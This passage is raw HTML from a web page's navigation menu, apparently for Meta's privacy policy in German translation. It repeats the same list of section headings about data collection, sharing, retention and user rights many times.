                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
